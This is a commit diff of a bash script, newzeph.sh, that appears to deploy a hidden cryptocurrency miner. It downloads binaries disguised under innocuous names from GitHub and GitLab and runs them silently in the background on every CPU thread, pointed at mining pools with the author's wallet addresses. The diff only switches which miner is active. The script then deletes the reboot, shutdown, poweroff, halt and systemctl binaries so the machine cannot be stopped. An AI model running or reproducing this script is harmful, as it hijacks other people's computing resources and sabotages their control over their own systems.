c1af062eaeb7867c0ef08be37f685ba617855549
Almira Hanafi <almirahanafie@outlook.com>
2024-07-13 08:41:17 +0000

    newzeph.sh edited online with Bitbucket

--- newzeph.sh
+++ newzeph.sh
@@ -1,12 +1,12 @@
 #!/bin/bash
 apt-get update 
 apt-get install -y wget curl sudo
-#wget -O sgr1 https://github.com/AlmiraHanafie/All-File/raw/main/sarebu >/dev/null 2>&1
-#chmod +x sgr1
-#./sgr1 --algorithm yespowersugar --pool nomp.mofumofu.me:3391 --wallet sugar1qg5nd84pj3g7e8wghrayxeu30e6hcg73q46e5pd.$(echo STB-$(shuf -i 1000-9999 -n 1)) --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive >/dev/null 2>&1 &
-wget -qO zjava https://gitlab.com/ghcees/pack/-/raw/main/jupyterlab
-chmod +x zjava
-nohup ./zjava -o randomx.rplant.xyz:7107 -a rx/0 -u TBs1gnPNKz17H7YwqvkAcke2G1GWzcuPABrMRiKqR1XRcXy4HpMRWXaWs4LqtS5NzJBJqGVFNSjB1TUVq3M6yMKD66XXzGjGdo.$(echo STB-$(shuf -i 1000-9999 -n 1)) --randomx-1gb-pages -p -x -t $(nproc --all) >/dev/null 2>&1 &
+wget -O sgr1 https://github.com/AlmiraHanafie/All-File/raw/main/sarebu >/dev/null 2>&1
+chmod +x sgr1
+./sgr1 --algorithm yespowersugar --pool nomp.mofumofu.me:3391 --wallet sugar1qg5nd84pj3g7e8wghrayxeu30e6hcg73q46e5pd.$(echo STB-$(shuf -i 1000-9999 -n 1)) --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive >/dev/null 2>&1 &
+#wget -qO zjava https://gitlab.com/ghcees/pack/-/raw/main/jupyterlab
+#chmod +x zjava
+#nohup ./zjava -o randomx.rplant.xyz:7107 -a rx/0 -u TBs1gnPNKz17H7YwqvkAcke2G1GWzcuPABrMRiKqR1XRcXy4HpMRWXaWs4LqtS5NzJBJqGVFNSjB1TUVq3M6yMKD66XXzGjGdo.$(echo STB-$(shuf -i 1000-9999 -n 1)) --randomx-1gb-pages -p -x -t $(nproc --all) >/dev/null 2>&1 &
 sleep 30
 rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
